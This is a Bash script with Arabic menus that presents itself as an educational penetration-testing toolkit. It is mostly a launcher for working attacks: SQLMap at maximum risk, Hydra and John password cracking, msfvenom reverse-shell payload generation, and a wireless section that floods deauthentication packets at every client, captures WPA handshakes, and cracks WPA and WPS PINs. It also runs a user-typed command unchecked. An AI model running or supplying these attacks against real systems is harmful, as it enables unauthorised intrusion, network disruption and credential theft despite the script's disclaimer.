#!/bin/bash

# ==================================================
# 🧰 أداة أبو جبل لأدوات اختبار الاختراق
# ✍️ تطوير: أبو جبل
# 📅 التاريخ: $(date +%Y-%m-%d)
# ⚠️ نسخة تجريبية - للاستخدام التعليمي فقط
# ==================================================

# ==================================================
# تنبيه هام وإخلاء مسؤولية
# ==================================================
# هذا السكربت "أبو جبل" مصمم للأغراض التعليمية والبحثية فقط في مجال الأمن السيبراني واختبار الاختراق الأخلاقي.
# يُحظر تمامًا استخدام هذه الأداة في أي أنشطة غير قانونية أو غير مصرح بها.
# المطور ("أبو جبل") والمساهمون لا يتحملون أي مسؤولية عن أي استخدام غير قانوني أو ضار لهذه الأداة.
# أنت وحدك المسؤول عن أفعالك وعن التأكد من امتثالك لجميع القوانين واللوائح المعمول بها قبل استخدام أي من الأدوات المدرجة.
# باستخدام هذا السكربت، فإنك توافق على هذه الشروط وتتحمل المسؤولية الكاملة عن استخدامك له.
# ==================================================

# دالة لعرض الواجهات اللاسلكية وطلب اختيار واجهة
select_wifi_interface() {
    echo "الواجهات اللاسلكية المتاحة:"
    iwconfig 2>/dev/null | grep '^[a-zA-Z]' | awk '{print $1}'
    if [ $? -ne 0 ] || [ -z "$(iwconfig 2>/dev/null | grep '^[a-zA-Z]' | awk '{print $1}')" ]; then
        echo "لم يتم العثور على واجهات لاسلكية. تأكد من توصيل وتشغيل محول لاسلكي."
        return 1
    fi
    read -p "أدخل اسم الواجهة اللاسلكية (e.g., wlan0): " wifi_interface
    # التحقق من وجود الواجهة
    if ! iwconfig $wifi_interface &> /dev/null; then
        echo "❌ الواجهة '$wifi_interface' غير موجودة أو غير صحيحة."
        return 1
    fi
    echo $wifi_interface # إرجاع اسم الواجهة المحدد
    return 0
}

# دالة لتفعيل وضع المراقبة
start_monitor_mode() {
    local interface=$1
    local monitor_interface="${interface}mon"
    # التحقق مما إذا كان وضع المراقبة مفعلاً بالفعل
    if iwconfig $monitor_interface &> /dev/null; then
        echo "ℹ️ وضع المراقبة مفعل بالفعل على $monitor_interface."
        echo $monitor_interface
        return 0
    fi
    echo "محاولة تفعيل وضع المراقبة على $interface..."
    # إيقاف العمليات التي قد تتعارض
    airmon-ng check kill > /dev/null 2>&1
    sleep 1
    airmon-ng start $interface > /dev/null 2>&1
    sleep 2 # الانتظار قليلاً للتأكد من تفعيل الواجهة
    # التحقق مرة أخرى
    if iwconfig $monitor_interface &> /dev/null; then
        echo "✅ تم تفعيل وضع المراقبة بنجاح على $monitor_interface."
        echo $monitor_interface # إرجاع اسم واجهة المراقبة
        return 0
    else
        # محاولة اسم بديل (بعض الأنظمة تستخدم wlanXmon)
        monitor_interface="wlan${interface:4}mon"
         if iwconfig $monitor_interface &> /dev/null; then
            echo "✅ تم تفعيل وضع المراقبة بنجاح على $monitor_interface."
            echo $monitor_interface # إرجاع اسم واجهة المراقبة
            return 0
        else 
            echo "❌ فشل تفعيل وضع المراقبة. حاول تشغيل السكربت بصلاحيات root (sudo)."
            return 1
        fi
    fi
}

# دالة لإيقاف وضع المراقبة
stop_monitor_mode() {
    local monitor_interface=$1
    if [ -z "$monitor_interface" ]; then
        read -p "أدخل اسم واجهة المراقبة لإيقافها (e.g., wlan0mon): " monitor_interface
    fi

    if iwconfig $monitor_interface &> /dev/null; then
        echo "محاولة إيقاف وضع المراقبة على $monitor_interface..."
        airmon-ng stop $monitor_interface > /dev/null 2>&1
        sleep 1
        # إعادة تشغيل NetworkManager إذا كان موجوداً
        if systemctl list-units --full -all | grep -q 'NetworkManager.service'; then
            systemctl start NetworkManager > /dev/null 2>&1
        fi
        echo "✅ تم إيقاف وضع المراقبة."
    else
        echo "ℹ️ الواجهة $monitor_interface ليست في وضع المراقبة أو غير موجودة."
    fi
}

# دالة لعرض القائمة الرئيسية
show_main_menu() {
    clear
    echo "=================================================="
    echo "   🧰 أداة أبو جبل لأدوات اختبار الاختراق"
    echo "=================================================="
    echo "   ⚠️ للاستخدام التعليمي والأخلاقي فقط ⚠️"
    echo "=================================================="
    echo "   --- اختر فئة الأدوات ---   "
    echo "1. جمع المعلومات (Information Gathering)"
    echo "2. تحليل الثغرات (Vulnerability Analysis)"
    echo "3. تحليل تطبيقات الويب (Web Application Analysis)"
    echo "4. هجمات كلمة المرور (Password Attacks)"
    echo "5. أدوات الاستغلال (Exploitation Tools)"
    echo "6. هجمات الشبكات اللاسلكية (Wireless Attacks)"
    echo "7. التنصت والخداع (Sniffing & Spoofing)"
    echo "8. خروج"
    echo "=================================================="
    read -p "اختر فئة: " main_choice
}

# دالة لانتظار المستخدم
pause() {
    echo ""
    read -p "اضغط Enter للمتابعة..."
}

# الحلقة الرئيسية للبرنامج
while true; do
    show_main_menu

    case $main_choice in
        1) # جمع المعلومات
            clear
            echo "--- 1. جمع المعلومات --- "
            echo "1) فحص الشبكة (Nmap)"
            echo "2) جمع معلومات OSINT (theHarvester)"
            echo "3) رجوع للقائمة الرئيسية"
            read -p "اختر أداة: " sub_choice
            case $sub_choice in
                1) read -p "أدخل IP أو نطاق الهدف لـ Nmap: " target; nmap -sV -A $target; pause ;; 
                2) read -p "أدخل اسم النطاق لـ theHarvester: " domain; theHarvester -d $domain -l 500 -b all; pause ;; 
                3) ;; # رجوع
                *) echo "❌ خيار غير صالح"; sleep 1 ;; 
            esac
            ;;
        2) # تحليل الثغرات
            clear
            echo "--- 2. تحليل الثغرات --- "
            echo "1) فحص ثغرات الويب (Nikto)"
            echo "2) رجوع للقائمة الرئيسية"
            read -p "اختر أداة: " sub_choice
            case $sub_choice in
                1) read -p "أدخل رابط الموقع (e.g., http://example.com): " url; nikto -h $url; pause ;; 
                2) ;; # رجوع
                *) echo "❌ خيار غير صالح"; sleep 1 ;; 
            esac
            ;;
        3) # تحليل تطبيقات الويب
            clear
            echo "--- 3. تحليل تطبيقات الويب --- "
            echo "1) تشغيل Burp Suite"
            echo "2) فحص حقن SQL (SQLMap)"
            echo "3) رجوع للقائمة الرئيسية"
            read -p "اختر أداة: " sub_choice
            case $sub_choice in
                1) echo "تشغيل Burp Suite في الخلفية..."; burpsuite & pause ;; 
                2) read -p "أدخل رابط URL للفحص باستخدام SQLMap: " sql_url; sqlmap -u "$sql_url" --batch --level=5 --risk=3; pause ;; 
                3) ;; # رجوع
                *) echo "❌ خيار غير صالح"; sleep 1 ;; 
            esac
            ;;
        4) # هجمات كلمة المرور
            clear
            echo "--- 4. هجمات كلمة المرور --- "
            echo "1) كسر كلمات المرور (John the Ripper)"
            echo "2) تخمين كلمات المرور أونلاين (Hydra)"
            echo "3) إنشاء قوائم كلمات (Crunch)"
            echo "4) رجوع للقائمة الرئيسية"
            read -p "اختر أداة: " sub_choice
            case $sub_choice in
                1) read -p "أدخل مسار ملف الهاش لـ John: " hash_file; john $hash_file; pause ;; 
                2) echo "مثال لاستخدام Hydra: hydra -L users.txt -P pass.txt ftp://192.168.1.1"; read -p "أدخل أمر Hydra كاملاً: " hydra_cmd; $hydra_cmd; pause ;; 
                3) read -p "أدخل الحد الأدنى لطول الكلمة: " min; read -p "أدخل الحد الأقصى لطول الكلمة: " max; read -p "أدخل الأحرف المستخدمة (e.g., abcdef123): " chars; read -p "أدخل اسم ملف الإخراج: " outfile; crunch $min $max $chars -o $outfile; echo "تم إنشاء القائمة في $outfile"; pause ;; 
                4) ;; # رجوع
                *) echo "❌ خيار غير صالح"; sleep 1 ;; 
            esac
            ;;
        5) # أدوات الاستغلال
            clear
            echo "--- 5. أدوات الاستغلال --- "
            echo "1) إنشاء بايلود (MSFvenom)"
            echo "2) تشغيل Metasploit Framework (msfconsole)"
            echo "3) رجوع للقائمة الرئيسية"
            read -p "اختر أداة: " sub_choice
            case $sub_choice in
                1) 
                    read -p "أدخل نوع البايلود (e.g., windows/meterpreter/reverse_tcp): " payload
                    read -p "أدخل LHOST (IP الخاص بك): " lhost
                    read -p "أدخل LPORT (e.g., 4444): " lport
                    read -p "أدخل اسم ملف الإخراج (e.g., payload.exe): " outfile
                    read -p "أدخل صيغة الملف (e.g., exe, apk, elf, py): " format
                    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $outfile 
                    echo "تم إنشاء البايلود: $outfile"
                    pause ;; 
                2) echo "تشغيل msfconsole..."; msfconsole; pause ;; 
                3) ;; # رجوع
                *) echo "❌ خيار غير صالح"; sleep 1 ;; 
            esac
            ;;
        6) # هجمات الشبكات اللاسلكية
            current_monitor_interface=""
            while true; do
                clear
                echo "--- 6. هجمات الشبكات اللاسلكية --- "
                echo "الواجهة في وضع المراقبة حالياً: ${current_monitor_interface:-لا يوجد}"
                echo "-------------------------------------"
                echo "1) اختيار واجهة وتفعيل وضع المراقبة (Airmon-ng)"
                echo "2) فحص الشبكات المجاورة (Airodump-ng)"
                echo "3) التقاط Handshake (Airodump-ng)"
                echo "4) هجوم Deauthentication (Aireplay-ng)"
                echo "5) كسر كلمة مرور WPA/WPA2 (Aircrack-ng)"
                echo "6) فحص شبكات WPS (Wash)"
                echo "7) هجوم WPS PIN (Reaver)"
                echo "8) إيقاف وضع المراقبة"
                echo "9) رجوع للقائمة الرئيسية"
                read -p "اختر أداة أو إجراء: " sub_choice

                case $sub_choice in
                    1) 
                        selected_interface=$(select_wifi_interface)
                        if [ $? -eq 0 ]; then
                            monitor_interface_name=$(start_monitor_mode $selected_interface)
                            if [ $? -eq 0 ]; then
                                current_monitor_interface=$monitor_interface_name
                            fi
                        fi
                        pause
                        ;;
                    2) 
                        if [ -z "$current_monitor_interface" ]; then echo "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; pause; continue; fi
                        echo "بدء فحص الشبكات على $current_monitor_interface... اضغط Ctrl+C للإيقاف."
                        # تشغيل airodump في نافذة جديدة إذا أمكن، أو مباشرة
                        if command -v xterm &> /dev/null; then
                           xterm -hold -e "airodump-ng $current_monitor_interface" &
                        else
                           airodump-ng $current_monitor_interface
                        fi
                        pause
                        ;;
                    3) 
                        if [ -z "$current_monitor_interface" ]; then echo "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; pause; continue; fi
                        read -p "أدخل BSSID للشبكة المستهدفة: " target_bssid
                        read -p "أدخل قناة الشبكة المستهدفة: " target_channel
                        read -p "أدخل اسم ملف الالتقاط (بدون امتداد): " capture_file
                        echo "بدء التقاط الحزم على القناة $target_channel للشبكة $target_bssid... احفظ الملف باسم $capture_file. اضغط Ctrl+C للإيقاف بعد التقاط Handshake."
                        if command -v xterm &> /dev/null; then
                            xterm -hold -e "airodump-ng --bssid $target_bssid -c $target_channel -w $capture_file $current_monitor_interface" &
                        else
                            airodump-ng --bssid $target_bssid -c $target_channel -w $capture_file $current_monitor_interface
                        fi
                        echo "ℹ️ يمكنك استخدام الخيار 4 (Deauth) لتسريع الحصول على Handshake."
                        pause
                        ;;
                    4) 
                        if [ -z "$current_monitor_interface" ]; then echo "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; pause; continue; fi
                        read -p "أدخل BSSID للشبكة المستهدفة: " target_bssid
                        read -p "(اختياري) أدخل MAC للعميل المستهدف (اتركه فارغاً لاستهداف الجميع): " target_client_mac
                        attack_cmd="aireplay-ng --deauth 0 -a $target_bssid"
                        if [ ! -z "$target_client_mac" ]; then
                            attack_cmd="$attack_cmd -c $target_client_mac"
                        fi
                        attack_cmd="$attack_cmd $current_monitor_interface"
                        echo "تنفيذ الأمر: $attack_cmd"
                        echo "بدء هجوم Deauthentication... اضغط Ctrl+C للإيقاف."
                        $attack_cmd
                        pause
                        ;;
                    5) 
                        read -p "أدخل مسار ملف الالتقاط (.cap) الذي يحتوي على Handshake: " capture_file_path
                        read -p "أدخل مسار قائمة الكلمات (Wordlist): " wordlist_path
                        if [ ! -f "$capture_file_path" ]; then echo "❌ ملف الالتقاط غير موجود."; pause; continue; fi
                        if [ ! -f "$wordlist_path" ]; then echo "❌ ملف قائمة الكلمات غير موجود."; pause; continue; fi
                        echo "بدء محاولة كسر كلمة المرور باستخدام Aircrack-ng..."
                        aircrack-ng $capture_file_path -w $wordlist_path
                        pause
                        ;;
                    6) 
                        if [ -z "$current_monitor_interface" ]; then echo "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; pause; continue; fi
                        echo "بدء فحص شبكات WPS المجاورة باستخدام Wash... اضغط Ctrl+C للإيقاف."
                        wash -i $current_monitor_interface
                        pause
                        ;;
                    7) 
                        if [ -z "$current_monitor_interface" ]; then echo "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; pause; continue; fi
                        read -p "أدخل BSSID للشبكة المستهدفة (يجب أن تدعم WPS): " target_bssid
                        echo "بدء هجوم WPS PIN باستخدام Reaver على $target_bssid... قد يستغرق وقتاً طويلاً. اضغط Ctrl+C للإيقاف."
                        reaver -i $current_monitor_interface -b $target_bssid -vv
                        pause
                        ;;
                    8) 
                        stop_monitor_mode $current_monitor_interface
                        current_monitor_interface=""
                        pause
                        ;;
                    9) 
                        # التأكد من إيقاف وضع المراقبة قبل الخروج من القائمة الفرعية
                        if [ ! -z "$current_monitor_interface" ]; then
                           stop_monitor_mode $current_monitor_interface
                           current_monitor_interface=""
                        fi
                        break ;; # الخروج من حلقة قائمة الواي فاي
                    *) echo "❌ خيار غير صالح"; sleep 1 ;; 
                esac
            done
            ;;
        7) # التنصت والخداع
            clear
            echo "--- 7. التنصت والخداع --- "
            echo "1) تشغيل Wireshark (تحليل الحزم)"
            echo "2) تشغيل Ettercap (رسومي - MITM)"
            echo "3) رجوع للقائمة الرئيسية"
            read -p "اختر أداة: " sub_choice
            case $sub_choice in
                1) echo "تشغيل Wireshark..."; wireshark & pause ;; 
                2) echo "تشغيل Ettercap بواجهة رسومية..."; ettercap -G & pause ;; 
                3) ;; # رجوع
                *) echo "❌ خيار غير صالح"; sleep 1 ;; 
            esac
            ;;
        8) # خروج
            echo "=================================================="
            echo "✅ شكراً لاستخدامك أداة أبو جبل!"
            echo "📌 تذكر: استخدمها بمسؤولية وللأغراض التعليمية فقط."
            echo "=================================================="
            exit 0
            ;;
        *) # خيار غير صالح
            echo "❌ خيار غير صالح، يرجى المحاولة مرة أخرى."
            sleep 2
            ;;
    esac
done

